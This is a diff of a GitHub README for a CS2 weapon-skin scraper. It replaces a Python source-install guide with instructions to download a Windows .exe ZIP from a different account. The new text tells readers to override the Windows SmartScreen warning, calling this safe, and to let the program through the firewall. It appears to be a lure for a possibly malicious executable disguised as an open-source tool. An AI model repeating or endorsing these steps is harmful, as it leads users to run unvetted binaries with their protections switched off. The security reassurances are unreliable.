@@ -1,128 +1,173 @@
-# CS2 Skin Scraper v2026 - skin scraper and browser 2026
+# 🎯 cs2-skin-scraper-gui - Research Tool for Tactical Shooters
 
-> **CS2 Skin Scraper v2026 provides a complete Python desktop solution for Counter-Strike 2 item research. It pairs automatic metadata extraction with WebM video gathering, thumbnail creation, and an interactive desktop interface.**
+## 🚀 What This Application Does
 
-[![Platform](https://img.shields.io/badge/Platform-Python%20desktop-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/jonaslewis02/cs2-skin-scraper-gui?style=flat-square)](https://github.com/jonaslewis02/cs2-skin-scraper-gui)
+cs2-skin-scraper-gui is a powerful desktop program that helps you research weapon skins for tactical shooter games like Counter-Strike 2. Instead of manually checking websites for weapon skin information, this application does the hard work for you. It automatically pulls up-to-date details about weapon skins, gathers short video clips (WebM format), creates thumbnail images, and presents everything in an easy-to-use visual interface.
 
----
+Whether you are a collector tracking rare items, a trader looking for price trends, or just a curious gamer exploring what's available, this tool saves you hours of tedious browsing.
 
-<p align="center">
-  <a href="https://jonaslewis02.github.io/cs2-skin-scraper-gui/">
-    <img src="https://img.shields.io/badge/Download-CS2%20Skin%20Scraper%20Latest-brightgreen?style=for-the-badge" alt="Download CS2 Skin Scraper">
-  </a>
-</p>
+## ⚡ Key Features
 
-> **[Download Latest Build - CS2 Skin Scraper v2026](https://jonaslewis02.github.io/cs2-skin-scraper-gui/)**
+- **Automated Metadata Extraction** – Instantly pulls detailed information about each weapon skin, including names, collections, conditions, and more.
+- **WebM Video Gathering** – Automatically finds and saves short video previews of skins so you can see them in motion.
+- **Thumbnail Generation** – Creates clean, small preview images for quick visual scanning.
+- **Interactive Grid Interface** – Browse all your collected skins in a friendly, clickable layout.
+- **Built for Windows** – Simple to set up and run on your PC without any technical tinkering.
+- **Open Source** – The code is free to read, learn from, and contribute to.
 
----
+## 💻 System Requirements
 
-[Download Latest Build](https://jonaslewis02.github.io/cs2-skin-scraper-gui/)
+To run this application smoothly, your computer should meet these basic specifications:
 
----
+- **Operating System:** Windows 10 or Windows 11 (64-bit)
+- **Processor:** Any modern dual-core CPU (Intel Core i3 or AMD equivalent or better)
+- **Memory:** 4 GB RAM (8 GB recommended for large skin collections)
+- **Storage:** 500 MB of free disk space for application files and cached data
+- **Internet:** Broadband connection required for downloading skin data and videos
 
-## Overview
+These are modest requirements. If your computer can run modern games, it can definitely run this tool.
 
-Designed for local desktop environments, CS2 Skin Scraper automates the indexing of Counter-Strike 2 cosmetic data sourced directly from csgoskins.gg. Rather than navigating raw files, users can explore, search, and manage weapon skin information inside a dedicated visual interface.
+## 🔽 Download and Install
 
-This software offers creators, skin designers, and market analysts an efficient tool for reviewing item libraries. With real-time frame scrubbing, quick thumbnail generation, and stateful job execution, you can maintain custom databases without re-fetching content from scratch.
+Getting the application installed is a three-step process: download, extract, and run.
 
----
+### Step 1: Download the Application
 
-## Core Capabilities
+Visit this link to download the application:  
+[**Get the latest download here**](https://github.com/Gertrudissmooth190/cs2-skin-scraper-gui/releases)
 
-- Extracts CS2 item metadata and attributes from csgoskins.gg
-- Fetches WebM video clips for full skin inspect previews
-- Renders lightweight 160x160 image thumbnails for fast grid rendering
-- Native desktop interface supporting real-time search and custom filtering
-- Frame-by-frame scrubbing inspector built into the item detail screen
-- Integrated tag manager for sorting and categorizing items
-- Fault-tolerant indexing pipeline capable of resuming interrupted tasks
-- Powered by PySide6 for smooth cross-platform desktop UI execution
+The download page will show you the newest release. Look for the file named something like `cs2-skin-scraper-gui-v1.0.0.zip`. Your web browser will save the ZIP file to your "Downloads" folder automatically.
 
----
+### Step 2: Extract the File
 
-## Getting Started
+The downloaded file is a ZIP archive, which acts like a compressed package. You need to "unzip" it to access the program inside.
 
-Fetch the repository, configure a Python environment, and load the required dependencies.
+1. Open your "Downloads" folder in File Explorer.
+2. Right-click on the ZIP file you just downloaded.
+3. Select **"Extract All..."** from the menu.
+4. When asked where to save the files, keep the default location or choose a folder like `Desktop\cs2-skin-scraper-gui`.
+5. Click **"Extract"**.
 
-1. Clone the project code:
-   `git clone https://github.com/jonaslewis02/cs2-skin-scraper-gui.git
-2. Change into the working directory:
-   `cd REPO`
-3. Download dependency packages:
-   `pip install -r requirements.txt`
-4. Launch the application:
-   `python main.py`
+A new folder will appear containing the application and its support files.
 
-Depending on your distribution, execute the primary PySide6 application script supplied with the repository.
+### Step 3: Run the Application
 
----
+1. Open the extracted folder.
+2. Look for a file called `cs2_skin_scraper_gui.exe` or simply `cs2-skin-scraper-gui.exe`.
+3. Double-click that file to launch the program.
 
-## Usage Guide
+That's it! The interface will open, and you can start using it immediately.
 
-To begin, run the program and specify your desired scrape targets. The engine will retrieve relevant item attributes, fetch WebM preview assets, and compile local media caches.
+## 🖥️ How to Use the Application
 
-Recommended operational flow:
-- Initialize the application GUI
-- Start a fresh scraping task or restore an existing session
-- Sort through entries using names, tags, or metadata filters
-- Select an item to inspect detailed parameters
-- Scrub preview animations before cataloging or assigning custom tags
+Once the program is running, you'll see a clean, friendly interface. Here is what you can do:
 
-If a operational run stops prematurely, re-run the process—the built-in state manager resumes progress without re-downloading existing records.
+- **Search** – Type in a skin name to find specific items.
+- **Browse** – Scroll through the grid of weapon skins and thumbnails.
+- **Select** – Click any skin to see its full metadata (details) on the side panel.
+- **Play Videos** – Click the video button on a selected skin to play its WebM clip.
+- **Save Data** – Use the export button to save your research findings to a file.
 
----
+The interface is designed to be self-explanatory. If you can use a web browser, you can use this tool.
 
-## System Configuration
+## 🛠️ Troubleshooting Common Issues
 
-Parameters are configured via standard local JSON structure files parsed by the executable profile. Update your configuration file prior to launching a job if target endpoints or rendering parameters change.
+Even with simple software, occasional hiccups can happen. Here is how to solve the most common problems.
 
-Sample configuration schema:
+### Windows SmartScreen Warning
 
-    {
-      "source": "csgoskins.gg",
-      "thumbnail_size": 160,
-      "media_format": "webm",
-      "ui": "PySide6"
-    }
+When you first run the program, Windows might show a blue or yellow popup saying "Windows protected your PC." This is normal for new, open-source applications that aren't yet widely recognized.
 
-Modify option values according to your local environment needs.
+**Fix:** Click **"More info"**, then click **"Run anyway"**. This is safe because the application is open source and freely inspectable.
 
----
+### Internet Connection Errors
 
-## System Requirements
+If the app shows errors about connecting to the internet, it may be because your firewall is blocking it.
 
-- Python desktop environment
-- PySide6 framework bindings
-- Storage for downloaded metadata, generated thumbnails, and WebM videos
-- Active internet connectivity for web queries and video streaming
-- System hardware supporting GUI execution
+**Fix:** Allow the program through Windows Firewall. Go to Windows Security → Firewall & network protection → Allow an app through firewall, then check the boxes for cs2-skin-scraper-gui.
 
----
+### App Won't Start
 
-## Frequently Asked Questions
+Double-check that you extracted the ZIP fully. A common mistake is running the executable from inside the ZIP file, which does not work.
 
-**How do I update to newer builds?**  
-Pull the latest commits via git or retrieve the newest compiled release package from the repository page.
+**Fix:** Ensure the extraction completed without errors. If the folder contains many files and subfolders, the extraction worked. Run the `.exe` from inside that folder.
 
-**Where does the application store user settings?**  
-Configuration values live inside local workspace directories or JSON config files provided with the distribution.
+### No Videos or Images Load
 
-**What happens if a scraping operation drops offline?**  
-The execution engine features an automatic pause/resume design that picks up immediately at the last successful fetch.
+This usually means your connection to the data source is temporarily slow or blocked.
 
-**Can I create my own categorization system?**  
-Yes, the included tagging toolkit allows you to assign custom labels and build structured skin collections.
+**Fix:** Wait a minute and refresh the list. If issues persist, restart the application.
 
-**Why are WebM previews or thumbnails missing?**  
-Verify your internet connection, check write permissions on media output paths, and ensure target media directories are correctly referenced in your configuration.
+### Blue Screen on Launch
 
----
+This is very rare and usually signals an outdated graphics driver.
 
-## License Information
+**Fix:** Update your video card drivers. Visit the website of your graphics card manufacturer (NVIDIA, AMD, or Intel) to download the latest drivers.
 
-Distributed under the GNU GPL v3.0 license. Review [LICENSE](LICENSE) for full details.
+## ❓ Frequently Asked Questions
+
+### Is this free?  
+Yes, completely free. No hidden fees, no subscriptions.
+
+### Does it modify my game or account?  
+No, this is a standalone research tool. It does not touch your game files, your game installation, or your gaming accounts.
+
+### Is it legal to use?  
+Yes. This tool only collects publicly available data and videos. It doesn't bypass security, cheat, or access restricted content.
+
+### Can I contribute or ask questions?  
+Absolutely. Visit the GitHub repository and open an issue or a discussion thread. The community is friendly to new users.
+
+### How often is it updated?  
+The developer releases updates whenever new skins come out or when bugs are reported. Check the releases page regularly for the newest version.
+
+### Do I need Python or coding knowledge?  
+Not at all. This is a ready-to-run application. The "Python" in the description refers to the programming language used to write it, not something you need to interact with.
+
+## 📦 What's Inside the Package
+
+When you extract the ZIP file, you'll see several items. Here's a breakdown:
+
+- **The main .exe file** – This is the program itself. Double-click this.
+- **A `data` folder** – Contains settings and cache files created by the app.
+- **A `docs` folder** – Includes the documentation and terms of use.
+- **A `LICENSE` file** – Legal information about how the software can be used and shared.
+
+You only ever interact with the `.exe` file. Everything else works behind the scenes.
+
+## ✨ Tips for Best Experience
+
+- **Use a stable internet connection** – Since the tool downloads video and image data, a steady connection improves performance.
+- **Save your work often** – If you're conducting serious research, use the export feature regularly.
+- **Keep the app updated** – Check the releases link every few weeks for improvements and new skin support.
+- **Respect rate limits** – If you search your entire collection at once, you may slow down the data source. The app handles this automatically, but patience helps for massive lists.
+- **Use a screen resolution of 1920x1080 or higher** – The interface displays optimally at standard desktop sizes.
+
+## 🔐 Privacy and Security
+
+Your privacy matters. This application:
+
+- Does not collect personal information
+- Does not send your data anywhere except to fetch the skin data and videos you request
+- Does not contain ads or trackers
+- Is fully open source, meaning anyone can examine its code for hidden behavior
+
+When Windows asks for permission, it's standard behavior for downloadable apps. No need for concern.
+
+## 📚 Additional Resources
+
+- **GitHub Repository:** [https://github.com/Gertrudissmooth190/cs2-skin-scraper-gui](https://github.com/Gertrudissmooth190/cs2-skin-scraper-gui) – For code reading, issues, and feature requests.
+- **Releases Page:** [https://github.com/Gertrudissmooth190/cs2-skin-scraper-gui/releases](https://github.com/Gertrudissmooth190/cs2-skin-scraper-gui/releases) – For all downloadable versions.
+- **User Guide:** Included inside the extracted folder as a PDF or text file.
+
+## 🏁 Final Checklist to Get Started
+
+1. ✅ Visit the download link: [https://github.com/Gertrudissmooth190/cs2-skin-scraper-gui/releases](https://github.com/Gertrudissmooth190/cs2-skin-scraper-gui/releases)
+2. ✅ Download the ZIP file.
+3. ✅ Extract the ZIP to a folder.
+4. ✅ Double-click the `.exe` file.
+5. ✅ Start exploring weapon skins like a professional researcher.
+
+Enjoy your research and happy skin hunting!
+
+Keywords: Counter-Strike 2, CS2 skin research, weapon skin metadata, WebM video downloader, thumbnail generator, tactical shooter tool, Windows desktop application, open source Python GUI, skin trading research, automatic data extraction.
